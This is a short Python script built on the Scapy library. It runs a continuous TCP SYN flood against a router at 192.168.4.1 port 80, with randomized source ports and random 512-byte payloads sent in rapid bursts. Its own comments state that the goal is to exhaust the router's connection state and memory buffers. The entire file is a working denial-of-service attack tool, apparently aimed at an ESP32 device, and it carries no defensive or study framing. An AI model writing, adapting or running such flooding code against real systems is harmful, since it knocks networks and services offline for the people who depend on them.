from scapy.all import IP, TCP, send
import time
import os
import random

ROUTER_IP = "192.168.4.1"
TARGET_PORT = 80             
BURST_BATCH = 150  # Number of raw packets injected per micro-burst

def launch_raw_kernel_flood():
    print("="*60)
    print("⚡ RAW ASYNCHRONOUS PACKET INJECTION ENGINE (OS BYPASS)")
    print("="*60)
    print(f"[*] Target Routing Gateway     : {ROUTER_IP}:{TARGET_PORT}")
    print("[*] Configuration              : ZERO TIME_WAIT LOCKS / INFINITE STREAM")
    
    input("\nPress [ENTER] to execute physical wireless medium saturation...")
    
    cycle_count = 1
    try:
        while True:
            print(f"📡 [HARDWARE TRANSIT] Flushing packet burst block #{cycle_count} ({BURST_BATCH} raw frames)...")
            
            # Construct a raw, un-buffered Layer-3/Layer-4 network data payload block
            # Generating a random source port forces the ESP32 to open a brand-new state slot every single frame
            packet = (
                IP(dst=ROUTER_IP) / 
                TCP(sport=random.randint(1024, 65535), dport=TARGET_PORT, flags="S") / 
                os.urandom(512)  # Injects 512 bytes of raw data to exhaust router memory buffers instantly
            )
            
            # send() operates at Layer 3 to bypass local operating system state caches completely
            send(packet, count=BURST_BATCH, verbose=0)
            
            cycle_count += 1
            # A tiny 1-millisecond delay prevents your local laptop drivers from lagging out
            time.sleep(0.001)
            
    except KeyboardInterrupt:
        print("\n[+] Injection loop stopped by user. Releasing channel allocations.")
    except Exception as e:
        print(f"\n❌ INJECTION ERROR: Ensure you are running with sudo privileges. Details: {e}")

if __name__ == "__main__":
    launch_raw_kernel_flood()
